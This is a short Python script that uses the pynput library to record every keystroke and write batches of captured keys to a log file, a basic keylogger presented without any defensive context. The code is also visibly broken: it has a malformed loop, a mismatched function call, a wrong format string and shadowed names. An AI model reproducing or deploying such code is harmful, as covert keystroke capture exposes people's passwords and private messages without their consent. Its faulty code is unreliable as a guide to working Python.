import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(Key):
    global keys, count
    
    keys.append(Key)
    count += 1 
    print("(0) pressed".format(Key))
    
    if count >= 25:
        count = 0
        write_file(keys)
        keys = []
    
def write_file():
    with open("log.txt", "w") as f:
        for Key in keys
        k = str(Key).replace("'","")
        f.write(str(Key))

def on_release(Key):
    if Key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as Listener:
    Listener.join()